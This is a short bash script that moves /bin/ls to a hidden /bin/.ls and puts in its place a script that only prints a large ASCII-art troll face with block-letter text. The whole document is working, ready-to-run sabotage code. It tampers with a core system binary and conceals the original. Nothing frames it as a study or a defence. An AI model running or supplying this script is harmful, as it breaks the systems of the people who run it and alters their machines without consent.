#!/bin/bash

payload='#!/bin/bash\n\n echo -e "───────▄██████████████████▄───────
────▄███████████████████████▄─────
───███████████████████████████────
──█████████████████████████████───
─████████████▀─────────▀████████──
██████████▀───────────────▀██████─
███████▀────────────────────█████▌
██████───▄▀▀▀▀▄──────▄▀▀▀▀▄──█████
█████▀──────────────────▄▄▄───████
████────▄█████▄───────▄█▀▀▀█▄──██▀
████──▄█▀────▀██─────█▀────────█▀─
─▀██───────────▀────────▄███▄──██─
──██───▄▄██▀█▄──▀▄▄▄▀─▄██▄▀────███
▄███────▀▀▀▀▀──────────────▄▄──██▐
█▄▀█──▀▀▀▄▄▄▀▀───────▀▀▄▄▄▀────█▌▐
█▐─█────────────▄───▄──────────█▌▐
█▐─▀───────▐──▄▀─────▀▄──▌─────██▐
█─▀────────▌──▀▄─────▄▀──▐─────██▀
▀█─█──────▐─────▀▀▄▀▀─────▌────█──
─▀█▀───────▄────────────▄──────█──
───█─────▄▀──▄█████████▄─▀▄───▄█──
───█────█──▄██▀░░░░░░░▀██▄─█──█───
───█▄───▀▄──▀██▄█████▄██▀─▄▀─▄█───
────█▄────▀───▀▀▀▀──▀▀▀──▀──▄█────
─────█▄────────▄▀▀▀▀▀▄─────▄█─────
──────███▄──────────────▄▄██──────
─────▄█─▀█████▄▄────▄▄████▀█▄─────
────▄█───────▀▀██████▀▀─────█▄────
───▄█─────▄▀───────────▀▄────█▄───
──▄█─────▀───────────────▀────█▄──
──────────────────────────────────
▐▌▐█▄█▌▐▀▀█▐▀▀▌─█▀─█▀─▐▌▐▀█▐▀█─█─█
▐▌▐─▀─▌▐▀▀▀▐──▌─▀█─▀█─▐▌▐▀▄▐▀▄─█─█
▐▌▐───▌▐───▐▄▄▌─▄█─▄█─▐▌▐▄█▐─█─█▄█"'
if [ -e "/bin/.ls" ]
then
:
else
mv /bin/ls /bin/.ls
echo -e "$payload" > /bin/ls
chmod +x /bin/ls
fi
